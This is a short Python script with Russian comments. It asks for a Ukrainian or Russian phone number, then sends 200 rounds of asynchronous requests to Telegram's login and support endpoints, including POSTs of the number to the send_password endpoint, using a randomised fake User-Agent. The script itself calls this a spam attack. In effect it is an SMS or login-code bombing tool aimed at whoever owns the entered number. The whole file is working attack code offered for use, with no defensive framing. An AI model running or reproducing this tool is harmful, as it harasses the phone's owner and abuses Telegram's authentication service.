import aiohttp
import asyncio
import re
from fake_useragent import UserAgent

# Генерация случайного User-Agent
user = UserAgent().random
headers = {'User-Agent': user}

# Функция проверки номера телефона (только Украина +380 и Россия +7)
def is_valid_phone(phone: str) -> bool:
    phone = phone.strip()
    if phone.lower() == 'exit':
        return False  # Специальное значение для выхода
    # Убираем всё, кроме цифр и плюса
    if not re.match(r'^\+\d+$', phone):
        return False
    # Проверка на украинский (+380) или российский (+7) формат
    if phone.startswith('+380') and len(phone) == 13:
        return True
    if phone.startswith('+7') and len(phone) == 12:
        return True
    return False

# URL-адреса для атак (убраны лишние пробелы)
urls = [
    'https://my.telegram.org/auth/send_password',
    'https://telegram.org/support?setln=ru',
    'https://my.telegram.org/auth/'
]

max_rounds = 200  # Количество кругов атак

async def send_request(session, url, data=None):
    try:
        if data:
            async with session.post(url, headers=headers, data=data) as response:
                return await response.text()
        else:
            async with session.get(url, headers=headers) as response:
                return await response.text()
    except Exception as e:
        print(f"Ошибка при отправке запроса на {url}: {e}")
        return None

async def attack(session, phone):
    tasks = []
    data = {'phone': phone}
    for url in urls:
        if 'send_password' in url or 'register' in url:
            tasks.append(send_request(session, url, data))
        else:
            tasks.append(send_request(session, url))
    await asyncio.gather(*tasks)

async def main():
    while True:
        number = input('Введите номер телефона в формате +380XXXXXXXXX или +7XXXXXXXXXX (или "exit" для выхода): ').strip()
        if number.lower() == 'exit':
            print("Выход из программы.")
            return
        if is_valid_phone(number):
            break
        else:
            print("❌ Мы не принимаем этот номер. Убедитесь, что он соответствует формату Украины (+380) или России (+7).")

    input('Нажмите ENTER, чтобы начать спам-атаку на поддержку TELEGRAM...')
    
    async with aiohttp.ClientSession() as session:
        for i in range(1, max_rounds + 1):
            await attack(session, number)
            print(f"Attack Round {i} completed")

    print("Атака завершена. Все круги выполнены.")

if __name__ == "__main__":
    asyncio.run(main())
